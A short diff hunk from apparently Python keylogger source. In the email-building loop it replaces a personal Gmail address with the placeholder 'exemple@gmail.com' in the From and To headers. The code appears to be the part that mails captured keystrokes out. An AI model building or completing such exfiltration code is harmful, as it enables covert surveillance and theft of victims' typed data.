@@ -42,8 +42,8 @@ class keylogger():
         while True:
             try:
                 msg = MIMEMultipart()
-                msg['From'] = "thaaoblues81@gmail.com"
-                msg['To'] = COMMASPACE.join("thaaoblues81@gmail.com")
+                msg['From'] = "exemple@gmail.com"
+                msg['To'] = COMMASPACE.join("exemple@gmail.com")
                 msg['Date'] = formatdate(localtime=True)
                 msg['Subject'] = "."
 
